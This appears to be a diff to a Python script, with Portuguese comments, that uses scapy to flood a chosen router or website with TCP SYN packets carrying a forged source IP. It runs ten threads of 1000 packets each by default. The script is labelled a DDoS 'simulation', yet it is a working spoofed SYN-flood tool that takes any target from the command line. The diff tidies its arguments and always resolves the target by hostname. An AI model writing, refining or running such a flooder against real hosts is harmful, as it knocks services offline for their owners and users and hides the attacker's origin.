@@ -1,60 +1,52 @@
 import argparse
 import threading
+import socket
 from scapy.all import *
 
-def send_packet(target_ip, target_port, fake_ip):
+def send_packet(target_ip, fake_ip, port=80):
     try:
         # Construir o pacote TCP com IP falsificado
-        packet = IP(src=fake_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
-        
+        packet = IP(src=fake_ip, dst=target_ip)/TCP(dport=port, flags="S")
         # Enviar pacote usando send function do scapy
         send(packet, verbose=0)
     except Exception as e:
         print(f"Erro ao enviar pacote: {e}")
 
-def attack(target_ip, target_port, fake_ip, num_packets):
-    print(f"Iniciando envio de {num_packets} pacotes TCP/IP do IP falso {fake_ip} para {target_ip}:{target_port}...")
+def attack(target_ip, fake_ip, num_packets, port=80):
+    print(f"Iniciando envio de {num_packets} pacotes TCP/IP do IP falso {fake_ip} para {target_ip}:{port}...")
 
     try:
         # Enviar múltiplos pacotes usando scapy
         for _ in range(num_packets):
-            send_packet(target_ip, target_port, fake_ip)
+            send_packet(target_ip, fake_ip, port)
     except KeyboardInterrupt:
         print("\nEnvio de pacotes interrompido.")
 
 def main():
     parser = argparse.ArgumentParser(description="Simulação de ataque DDoS com pacotes TCP/IP")
-    parser.add_argument("target_type", choices=['router', 'site'], help="Tipo de alvo: 'router' para roteador Wi-Fi por IP, 'site' para site específico")
     parser.add_argument("target", help="IP do roteador ou URL do site")
-    parser.add_argument("-p", "--port", type=int, default=80, help="Porta do servidor alvo (padrão é 80)")
     parser.add_argument("fake_ip", help="IP falso para disfarçar a origem dos pacotes")
     parser.add_argument("-c", "--count", type=int, default=1000, help="Número de pacotes a enviar (padrão é 1000)")
+    parser.add_argument("-p", "--port", type=int, default=80, help="Porta do servidor alvo (padrão é 80)")
     args = parser.parse_args()
 
-    target_type = args.target_type
     target = args.target
-    target_port = args.port
     fake_ip = args.fake_ip
     num_packets = args.count
+    port = args.port
 
-    if target_type == 'router':
-        target_ip = target  # No caso de um roteador, o alvo é um IP
-    elif target_type == 'site':
-        # Resolver o nome do site para obter o IP
-        try:
-            target_ip = socket.gethostbyname(target)
-        except socket.gaierror as e:
-            print(f"Erro ao resolver o nome do site {target}: {e}")
-            return
-    else:
-        print("Tipo de alvo inválido.")
+    # Resolver o nome do site para obter o IP se necessário
+    try:
+        target_ip = socket.gethostbyname(target)
+    except socket.gaierror as e:
+        print(f"Erro ao resolver o nome do site {target}: {e}")
         return
 
     # Utilizar threads para enviar pacotes de forma concorrente
     threads = []
     try:
         for _ in range(10):  # Número de threads pode ser ajustado
-            thread = threading.Thread(target=attack, args=(target_ip, target_port, fake_ip, num_packets))
+            thread = threading.Thread(target=attack, args=(target_ip, fake_ip, num_packets, port))
             threads.append(thread)
             thread.start()
 
